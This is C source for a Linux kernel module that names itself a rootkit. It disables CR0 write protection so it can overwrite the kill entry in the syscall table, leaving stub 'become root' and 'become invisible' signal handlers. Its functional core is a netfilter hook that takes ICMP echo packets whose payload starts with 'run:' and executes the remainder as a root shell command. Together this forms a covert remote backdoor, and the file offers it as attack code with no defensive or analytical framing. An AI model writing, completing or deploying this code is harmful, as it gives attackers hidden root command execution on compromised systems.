/*
 Works for kernel versions >= (4,17,0)
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/netfilter_ipv4.h>


// Syscall table address pointer
unsigned long *__sys_call_table_addr;

enum signals {
    SIGSUPER = 64, // Become root
    SIGINVIS = 63, // Become invisible
};


// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
static syscall_wrapper orig_kill;

// write_cr0 is useless in a 5x linux kernell
// cr0 allows supervisor-level procedures to write into read-only pages
static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk("Signal 64 was intercepted | became root");
        return 0;
    } else if (sig == SIGINVIS) {
        printk("Signal 63 was intercepted | became invisible");
        return 0;
    }

    return orig_kill(regs);
}

#endif


static void store(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_syscall(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}

#include <linux/ip.h>
#include <linux/icmp.h>

#define MAX_CMD_LEN 1976


char cmd_string[MAX_CMD_LEN];

struct work_struct my_work;

static void work_handler(struct work_struct * work)
{
    static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
    static char *envp[] = {"PATH=/bin:/sbin", NULL};

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

DECLARE_WORK(my_work, work_handler);

// ICMP hook
static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    int j = 0;

    pr_info("icmp_cmd_executor executing\n");

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);

    if (iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    j = 0;
    while (user_data != tail){
        char c = *user_data;

        cmd_string[j] = c;
        j++;

        if (c == '\0' || j == MAX_CMD_LEN){
            break;
        }

        user_data++;
    }

    pr_info("cmd_string: %s\n", cmd_string);

    if (strncmp(cmd_string, "run:", 4) == 0) {
        for (j = 0; cmd_string[j + 4] != '\0'; j++) {
            cmd_string[j] = cmd_string[j + 4];
        }
        cmd_string[j] = '\0';

        schedule_work(&my_work);
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nfho;

// Function that launches when module is inserted
static int __init mod_init(void)
{
    int ret; // to store return code of register_kprobe
    kallsyms_lookup_name_t kallsyms_lookup_name; // to store the address of kallsyms_lookup_name function

    pr_info("rootkit: started\n");
    nfho.hook = icmp_cmd_executor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);

#ifdef KPROBE_

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif
    __sys_call_table_addr = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    store();
    unprotect_memory();

    hook();
    protect_memory();

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

    unprotect_memory();
    restore_syscall();
    protect_memory();
    nf_unregister_net_hook(&init_net, &nfho);
}

MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
